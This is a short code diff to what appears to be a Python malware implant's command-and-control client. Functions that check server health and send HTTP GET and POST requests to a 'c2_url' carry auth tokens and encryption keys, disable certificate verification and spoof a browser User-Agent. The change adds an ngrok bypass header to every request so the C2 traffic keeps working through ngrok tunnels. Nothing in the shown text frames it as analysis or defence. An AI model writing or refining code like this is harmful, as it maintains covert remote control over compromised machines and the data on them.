@@ -145,7 +145,10 @@ def check_server_health(c2_url=None, timeout=5):
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
         opener = build_opener(HTTPSHandler(context=ctx))
-        req = Request(f"{c2_url}/api/health", headers={"User-Agent": "Mozilla/5.0"})
+        req = Request(f"{c2_url}/api/health", headers={
+            "User-Agent": "Mozilla/5.0",
+            "ngrok-skip-browser-warning": "true"
+        })
         resp = opener.open(req, timeout=timeout)
         data = json.loads(resp.read())
         return True, data
@@ -162,7 +165,11 @@ def http_post(path, data, c2_url=None, auth_token=None, enc_key=None):
     enc_key = enc_key or ENC_KEY
     
     payload_str = json.dumps(data)
-    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0",
+        "ngrok-skip-browser-warning": "true"
+    }
     if auth_token:
         headers["X-Auth-Token"] = auth_token
     if enc_key:
@@ -194,7 +201,10 @@ def http_get(path, c2_url=None, auth_token=None, enc_key=None, timeout=10):
     auth_token = auth_token or AUTH_TOKEN
     enc_key = enc_key or ENC_KEY
     
-    headers = {"User-Agent": "Mozilla/5.0"}
+    headers = {
+        "User-Agent": "Mozilla/5.0",
+        "ngrok-skip-browser-warning": "true"
+    }
     if auth_token:
         headers["X-Auth-Token"] = auth_token
     
